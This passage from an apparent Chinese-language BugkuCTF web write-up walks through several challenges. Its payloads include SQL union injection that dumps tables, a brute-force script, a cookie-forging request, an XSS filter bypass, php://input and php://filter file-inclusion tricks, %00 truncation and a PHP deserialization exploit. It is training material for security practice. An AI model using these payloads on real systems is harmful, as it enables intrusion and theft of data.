class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                        s=str(a)+str(b)+str(c)+str(d)+str(e)</span><br><span class="line">                        <span class="comment">#time.sleep(0.1)</span></span><br><span class="line">                        print(<span class="string">'try: '</span>,s)</span><br><span class="line">                        datas=&#123;<span class="string">'pwd'</span>:s&#125;</span><br><span class="line">                        datas_encode=parse.urlencode(datas).encode(encoding=<span class="string">'UTF8'</span>)</span><br><span class="line">                        url=<span class="string">"http://120.24.86.145:8002/baopo/"</span></span><br><span class="line">                        req=request.Request(url,data=datas_encode)</span><br><span class="line">                        page=request.urlopen(req).read().decode()</span><br><span class="line">                        <span class="comment">#print(page)</span></span><br><span class="line">                        file.write(page+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h2 id="点击一百万次-杂-注入-代码审计"><a href="#点击一百万次-杂-注入-代码审计" class="headerlink" title="点击一百万次-杂+注入+代码审计"></a>点击一百万次-杂+注入+代码审计</h2><p>查看源码，发现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">  $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#cookie"</span>)</span><br><span class="line">      .mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">      &#125;)</span><br><span class="line">      .mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">        clicks++;</span><br><span class="line">        $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">        <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>发现当clicks这个变量大于1000000时，会通过一个post请求发送clicks，那么我们直接通过post提交一个clicks=100000000即可得到flag。</p><h2 id="备份是个好习惯-代码审计"><a href="#备份是个好习惯-代码审计" class="headerlink" title="备份是个好习惯-代码审计"></a>备份是个好习惯-代码审计</h2><p>这一题提示是备份，打开网页后又啥也没有，扫描网站敏感文件，扫出了index.php.bak，那么访问下载下来，打开发现是index.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);<span class="comment">//获取当前url，然后从?后开始截取</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>);  <span class="comment">//去掉str的第一个字符，即?</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);   <span class="comment">//将str中的key替换成空，即去除key，</span></span><br><span class="line">parse_str($str); <span class="comment">//使得str里的变量赋予被执行</span></span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>整个即是要求我们要通过get的方法在url中输入变量key1和key2，虽说过滤了key，但只过滤了一次，只要构造<code>kekeyy1</code>和<code>kekeyy2</code>即可，然后key1的值要和key2的值不相等，但是hash值要想等。此时则要利用数组来绕过，构造的payload是<code>?kkeyey1[]=1&amp;kekeyy2[]=2</code>，flag到手。</p><h2 id="成绩单-注入"><a href="#成绩单-注入" class="headerlink" title="成绩单-注入"></a>成绩单-注入</h2><p>首先是看见是sql查询，先用<code>id=1&#39; order by 3</code>来确定当前表一共有几列，发现有正常输出，则再来<code>id=1&#39; order by 4</code>，发现有4列，再来一次<code>id=1&#39; order by 5</code>，无输出则说明一共有4列。</p><p>然后就爆当前数据表的名字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="keyword">user</span>(),<span class="keyword">version</span>() #</span><br></pre></td></tr></table></figure><p>发现当前数据表为fl4g。</p><p>再爆数据表相应列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'fl4g'</span> #</span><br></pre></td></tr></table></figure><p>发现当前列为skctf_flag。</p><p>最后只要输入<code>id=-1&#39; union select 1,2,3,skctf_flag from fl4g #</code>即可获得flag。</p><h2 id="秋名山老司机-杂"><a href="#秋名山老司机-杂" class="headerlink" title="秋名山老司机-杂"></a>秋名山老司机-杂</h2><p>发现题目的要求是按照把显示的式子进行运算，然后提交。很明显有时间限制，那么写脚本提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">s = requests.Session()//为了保存回话session，让游览器认为是同一次回话</span><br><span class="line">source = s.get(url)//访问网站</span><br><span class="line">expression = re.search(<span class="string">r'(\d+[+\-*])+(\d+)'</span>, source.text).group()//获取式子</span><br><span class="line">result = eval(expression)//计算式子</span><br><span class="line">post = &#123;<span class="string">'value'</span>: result&#125;//用post提交value</span><br><span class="line">print(s.post(url, data = post).text)//提交计算结果</span><br></pre></td></tr></table></figure><h2 id="速度要快-杂"><a href="#速度要快-杂" class="headerlink" title="速度要快-杂"></a>速度要快-杂</h2><p>这题很坑，看题目很明显就是要写脚本，然后查看源码，让我们提交变量margin，然后就没有东西了，用bp抓包，发现返回的包的头信息flag，进行base64解密，变成奇怪的数据，再base64解密一次，发现最后的内容变成了正常的数据，那么明显就是要提交这个数据。和上一题一样，写脚本提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web6/'</span></span><br><span class="line"></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">headers=r.get(url).headers</span><br><span class="line"></span><br><span class="line">flag=base64.b64decode(base64.b64decode(headers[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>])</span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> r.post(url=url,data=data).content</span><br></pre></td></tr></table></figure><h2 id="cookies欺骗-杂"><a href="#cookies欺骗-杂" class="headerlink" title="cookies欺骗-杂"></a>cookies欺骗-杂</h2><p>打开后发现url<code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</code>后面的参数，<code>a2V5cy50eHQ=</code>base64解密一下，得到keys.php，那么明显就是输出文件为filename，行数为line的内容，那么我们把<code>index.php</code>base64加密一下，构造url<code>http://120.24.86.145:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</code>，然后输入不同的line，可以获得整个index.php的内容。</p><p>写了个简单的脚本获取内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    url=<span class="string">'http://120.24.86.145:8002/web11/index.php?line='</span>+str(i)+<span class="string">'&amp;filename=aW5kZXgucGhw'</span></span><br><span class="line">    <span class="keyword">print</span> s.get(url).text,</span><br></pre></td></tr></table></figure><p>则index.php为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]) ? $_GET[<span class="string">'filename'</span>] : <span class="string">""</span>);</span><br><span class="line">$line = <span class="keyword">isset</span>($_GET[<span class="string">'line'</span>]) ? intval($_GET[<span class="string">'line'</span>]) : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ($file == <span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'0'</span> =&gt; <span class="string">'keys.txt'</span>,</span><br><span class="line">    <span class="string">'1'</span> =&gt; <span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>] == <span class="string">'margin'</span>) &#123;</span><br><span class="line">    $file_list[<span class="number">2</span>] = <span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (in_array($file, $file_list)) &#123;</span><br><span class="line">    $fa = file($file);</span><br><span class="line">    <span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>所以要我们输出keys.php的内容，要有cookie[‘margin’]，则用bp抓包，构造，即可获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /web11/index.php?line=0&amp;filename=a2V5cy5waHA= HTTP/1.1</span><br><span class="line">Host: 120.24.86.145:8002</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: PHPSESSID=59khlluj4n97fqvs711ipkbbftoi08o6;margin=margin</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><h2 id="XSS-注入"><a href="#XSS-注入" class="headerlink" title="XSS-注入"></a>XSS-注入</h2><p>首先是查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span>&gt;</span><br><span class="line">&lt;h2&gt;XSS注入测试&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="regexp">&lt;p&gt;1、请注入一段XSS代码，获取Flag值&lt;/</span>p&gt;</span><br><span class="line">&lt;p&gt;<span class="number">2</span>、必须包含alert(_key_)，_key_会自动被替换&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line">&lt;div id=<span class="string">"s"</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入--&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/apps.bdimg.com/</span>libs/jquery/<span class="number">2.1</span><span class="number">.4</span>/jquery.min.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;</span></span><br><span class="line"><span class="string">&lt;script src="</span>http:<span class="comment">//apps.bdimg.com/libs/bootstrap/3.3.4/js/bootstrap.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> s=<span class="string">""</span>;<span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>发现了<img src="/2018/08/10/20180810-bugkuctf-wp/1530971094990.png" alt="1530971094990">和<img src="/2018/08/10/20180810-bugkuctf-wp/1530971120972.png" alt="1530971120972"></p><p>能够得知一块区域名为s，然后将s的内容嵌入html中，这恰恰是xss漏洞的原因。</p><p>然后输入<code>&lt;img src=1 onerror=alert&lt;_key&gt;</code>，发现没有弹窗，查看源代码，发现&lt;&gt;被转成了&amp;lt，&amp;gt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var s=&quot;?&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;;</span><br></pre></td></tr></table></figure><p>那么我们构造<code>?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</code>，用\u003c和\u003e来转义成&lt;&gt;，则可以得到flag。</p><h2 id="never-give-up-代码审计"><a href="#never-give-up-代码审计" class="headerlink" title="never give  up-代码审计"></a>never give  up-代码审计</h2><p>首先是打开后查看源码，里面有注释<code>1p.html</code>，访问，然后发现跳转到了论坛，那么使用bp来拦截跳转，发现里面的一串url代码，然后url解密，解密后base64解码，解密后再次url解码。</p><p>或者可以使用<code>view-source:</code>来防止跳转。 </p><p><img src="/2018/08/10/20180810-bugkuctf-wp/1530972930612.png" alt="1530972930612"></p><p>所获得代码为最开始打开网页的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))//stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');//把整个文件读入一个字符串中。</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现一个文件，直接访问<code>http://120.24.86.145:8006/test/f4l2a3g.txt</code>，获得flag。</p><p>正式做法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$data==”bugku is a nice plateform!”：可以令a=php:<span class="comment">//input，然后POST传值 bugku is a nice plateform! 绕过。</span></span><br><span class="line"></span><br><span class="line">strlen(b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(“<span class="number">111</span>”.substr(b,<span class="number">0</span>,<span class="number">1</span>),”<span class="number">1114</span>”) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>：可以利用%<span class="number">00</span>截断，令b=%<span class="number">0012345</span> 绕过。</span><br><span class="line"><span class="comment">//eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。</span></span><br><span class="line"><span class="comment">//substr() 函数返回字符串的一部分。</span></span><br><span class="line">!$_GET[‘id’]并且id==<span class="number">0</span>：令id=%<span class="number">00</span>或者令id=.都可以绕过。</span><br></pre></td></tr></table></figure><p><img src="/2018/08/10/20180810-bugkuctf-wp/1530974650182.png" alt="1530974650182"></p><h2 id="welcome-to-bugkuctf-代码审计"><a href="#welcome-to-bugkuctf-代码审计" class="headerlink" title="welcome to bugkuctf-代码审计"></a>welcome to bugkuctf-代码审计</h2><p>相应wp：<code>https://blog.csdn.net/csu_vc/article/details/78375203</code>和<code>https://www.cnblogs.com/Pinging/p/8278168.html</code></p><p>首先打开后查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>很明显要我们通过get输入变量。</p><p>首先是user，和上一题never give up一样，简单地通过txt=php://input，然后通过post的方法输入welcome to the bugkuctf，即可解决。</p><p>而这个include($file)，则需要通过<code>php://filter/read=convert.base64-encode/resource</code>来使用伪协议读取所包含文件的base64值。</p><p>然后构造payload为<code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>即可得到hint.php源码的base64加密后的结果。base64解密后得到源码。</p><p>hint.php的源代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造payload为<code>http://120.24.86.145:8006/test1/?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</code>来查看index.php的源代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸è½ç°å¨å°±ç»ä½ flagå¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>看到unserialize，又是反序列化，那么我们就要构造相应的序列化。</p><p>现在看源码，则明白了，首先是TXT的绕过，然后是file的格式匹配，这是防止直接读取flag，同时会导入file，然后反序列化变量。</p><p>那么我们就先需要去进行序列化，可以去该网站进行在线php代码运行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$info =<span class="keyword">new</span> Flag();</span><br><span class="line">$plain = serialize($info);</span><br><span class="line"><span class="keyword">echo</span> $plain;</span><br><span class="line"></span><br><span class="line"><span 